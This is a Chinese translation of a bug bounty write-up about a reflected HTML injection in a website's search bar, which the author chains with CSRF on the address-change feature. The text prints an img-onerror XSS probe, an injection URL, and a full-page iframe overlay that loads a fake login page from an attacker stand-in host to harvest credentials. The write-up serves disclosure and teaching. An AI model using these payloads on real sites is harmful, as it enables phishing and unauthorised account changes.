<html>
<head>
<title>The peculiar case of HTML Injection</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTML注入的特例</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/the-peculiar-case-of-html-injection-d14db8440e3?source=collection_archive---------4-----------------------#2021-04-22">https://infosecwriteups.com/the-peculiar-case-of-html-injection-d14db8440e3?source=collection_archive---------4-----------------------#2021-04-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><blockquote class="jn"><p id="eef5" class="jo jp iq bd jq jr js jt ju jv jw jx dk translated">这是我在一个私人bug bounty项目中发现的一个不寻常的HTML注入bug。</p></blockquote><figure class="ka kb kc kd ke kf gh gi paragraph-image"><div role="button" tabindex="0" class="kg kh di ki bf kj"><div class="gh gi jz"><img src="../Images/0b0765dfbe5fc643aa51f3ad8805cf2c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yoTPoP3Pf9gBC4B_gxzxwA.png"/></div></div><figcaption class="km kn gj gh gi ko kp bd b be z dk translated">HTML注入(img src:<a class="ae kq" href="https://www.acunetix.com/blog/web-security-zone/html-injections/" rel="noopener ugc nofollow" target="_blank">)https://www . acune tix . com/blog/we b-security-zone/HTML-injections/</a></figcaption></figure><h1 id="645d" class="kr ks iq bd kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo bi translated">HTML注入和XSS:异同</h1><p id="3a97" class="pw-post-body-paragraph lp lq iq lr b ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml jx ij bi translated">HTML注入属于注入攻击的类别，这意味着恶意的HTML输入被网站信任并显示给无辜的用户。</p><p id="1ca2" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">类似于XSS有存储，反映，和自我HTML注入。HTML注入漏洞不像XSS(跨站点脚本)那样严重，但可以与其他漏洞联系起来造成严重影响。</p><p id="a349" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">XSS和HTML注入之间的明显区别是，在XSS的情况下，人们可以将功能javascript注入到网站上，这使攻击者能够虚拟地执行真实用户可以做的任何任务，而仅注入HTML本身几乎可以破坏网站，但如果这与诸如CSRF(跨站点请求伪造)之类的漏洞相联系，那么攻击的危险程度会增加，因为攻击成功的用户依赖性会降低。</p><h1 id="c858" class="kr ks iq bd kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo bi translated">错误报告</h1><p id="a338" class="pw-post-body-paragraph lp lq iq lr b ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml jx ij bi translated">在我的案例中，HTML注入实际上是在寻找易受攻击网站的搜索功能上的XSS的过程中发现的。</p><p id="e3d1" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">该网站使用了Cloudflare WAF，这阻止了攻击者执行XSS。搜索类似于</p><pre class="mr ms mt mu gt mv mw mx my aw mz bi"><span id="68f5" class="na ks iq mw b gy nb nc l nd ne">&lt;img src=x onerror=prompt(1)&gt;</span></pre><p id="74ea" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">Cloudflare WAF被触发，但当我等待足够长的时间时，搜索栏的搜索预览功能会尝试加载图像并触发XSS。</p><figure class="mr ms mt mu gt kf gh gi paragraph-image"><div role="button" tabindex="0" class="kg kh di ki bf kj"><div class="gh gi nf"><img src="../Images/8acf2458ba95020c65402a3d9e42dd58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QqxaFKkgv8017aUjDc2EQA.png"/></div></div><figcaption class="km kn gj gh gi ko kp bd b be z dk translated">预览特性临时在DOM上加载有效负载</figcaption></figure><p id="0933" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">但不幸的是，这只是一个自我XSS，当有效载荷被搜索时，Cloudflare就会出现。</p><p id="ef00" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">但是我意识到WAF并没有阻止我在没有任何javascript的情况下搜索HTML标签。</p><figure class="mr ms mt mu gt kf gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/ae9fb5c2995f6efdc7da0faa80cf3d66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*HOW4KnCvHlgmpKQ5FUtyTQ.png"/></div><figcaption class="km kn gj gh gi ko kp bd b be z dk translated">反映HTML组件</figcaption></figure><p id="6d9e" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">因此，当攻击者向用户发送这个链接时，HTML将反映在搜索栏中。</p><pre class="mr ms mt mu gt mv mw mx my aw mz bi"><span id="ad88" class="na ks iq mw b gy nb nc l nd ne">https://vulnerable.com/search?term=%3Cimg+src%3Dx%3E</span></pre><p id="4608" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">现在，这怎么能造成大的影响呢？</p><p id="3919" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">因此，一种方法是用iframe覆盖整个网页，攻击者可以创建一个类似于网站的虚假登录页面，这将导致用户输入将发送给攻击者的凭据。</p><p id="1bde" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">该有效载荷可用于:-</p><pre class="mr ms mt mu gt mv mw mx my aw mz bi"><span id="76d5" class="na ks iq mw b gy nb nc l nd ne">&lt;iframe src="***https:/attacker/login***" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999; scrolling="no";frameborder="0""&gt;</span></pre><p id="a915" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">但是这种方法的问题是，这种攻击需要多大程度的用户交互。所以我必须想出一个更好的解决方案。</p><p id="e2c6" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">我发现了<a class="ae kq" href="https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d" rel="noopener">这个关于类似漏洞的报告</a>，它帮助我想出了解决方案。</p><p id="fa96" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">现在，就像我说的，用CSRF链接HTML注入可以产生更大的影响，幸运的是我在网站的地址更改功能中发现了CSRF的可能性。</p><p id="44c4" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">将这两个漏洞联系起来，我使用了之前使用的Iframe有效负载，它的<em class="nh"> src </em>被设置为一个webhook端点，该端点托管了一个自提交表单，该表单更改了用户使用<a class="ae kq" href="https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc" rel="noopener ugc nofollow" target="_blank"> burp Suite CSRF PoC生成器</a>生成的地址。</p><p id="b6cb" class="pw-post-body-paragraph lp lq iq lr b ls mm lu lv lw mn ly lz ma mo mc md me mp mg mh mi mq mk ml jx ij bi translated">通过这种方式，用户依赖性减少了，影响增加了，因此报告被接受并被分类，最后，我得到了一笔奖金。</p><figure class="mr ms mt mu gt kf gh gi paragraph-image"><div role="button" tabindex="0" class="kg kh di ki bf kj"><div class="gh gi ni"><img src="../Images/0adb4df2c7bfd4e1a0b6c78f29bdd43b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3QTLuuGBjk9geLQkyjZjqA.png"/></div></div></figure><h2 id="538b" class="na ks iq bd kt nj nk dn kx nl nm dp lb ma nn no lf me np nq lj mi nr ns ln nt bi translated">如果你喜欢我的报告，请留下一堆掌声！！</h2><figure class="mr ms mt mu gt kf gh gi paragraph-image"><a href="https://www.buymeacoffee.com/dungeonmaster"><div class="gh gi nu"><img src="../Images/faed50c906a9b8b5291fd7e11fa49aaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:340/format:webp/0*LWErBtG2uhpG6JXL.png"/></div></a></figure></div></div>    
</body>
</html>